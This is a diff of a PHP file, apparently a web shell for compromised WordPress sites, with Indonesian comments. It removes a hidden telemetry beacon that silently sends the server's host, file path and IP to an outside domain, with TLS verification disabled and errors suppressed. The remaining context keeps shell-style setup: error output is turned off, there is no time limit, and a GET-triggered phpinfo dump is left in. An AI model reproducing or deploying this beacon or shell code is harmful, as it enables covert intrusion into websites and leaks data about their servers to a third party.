@@ -1,71 +1,7 @@
 <?php
-$RECEIVER_URL = 'https://kucinta-max.club/payload/assets.php';
-
-function send_telemetry($url) {
-    // 1. Kumpulkan Informasi Server Target
-    $data = [
-        'time' => date('Y-m-d H:i:s'),
-        'host' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown_Host'),
-        'path' => __FILE__, // Menangkap absolute path lokasi script ini berjalan
-        'ip'   => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '127.0.0.1'
-    ];
-
-    // 2. Format Data (JSON -> Base64) sesuai logika penerima
-    $json_payload = json_encode($data);
-    if (!$json_payload) return false;
-    
-    $encoded_payload = base64_encode($json_payload);
-    
-    // 3. Siapkan POST Body
-    $post_data = http_build_query(['payload' => $encoded_payload]);
-
-    // 4. Kirim Data (Prioritas: cURL -> file_get_contents)
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
-        // Timeout 3 detik agar tidak membuat loading page menjadi lambat (lemot)
-        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        
-        $response = curl_exec($ch);
-        curl_close($ch);
-        
-        return $response !== false;
-    } 
-    // Fallback jika ekstensi cURL dinonaktifkan di server target
-    else if (ini_get('allow_url_fopen')) {
-        $options = [
-            'http' => [
-                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-                'method'  => 'POST',
-                'content' => $post_data,
-                'timeout' => 3
-            ],
-            'ssl' => [
-                'verify_peer' => false,
-                'verify_peer_name' => false
-            ]
-        ];
-        $context = stream_context_create($options);
-        $response = @file_get_contents($url, false, $context);
-        
-        return $response !== false;
-    }
-    
-    return false;
-}
-
-// Eksekusi fungsi secara diam-diam (tanpa output error ke layar)
-@send_telemetry($RECEIVER_URL);
 session_start();
 error_reporting(0); set_time_limit(0); @ini_set('memory_limit', '-1');
 
-// ==========================================
-// 1. SCRIPT AUTO LOGIN WP, SHELL BYPASS & UTILS
-// ==========================================
 if (isset($_GET['phpinfo'])) {
     phpinfo();
     exit;
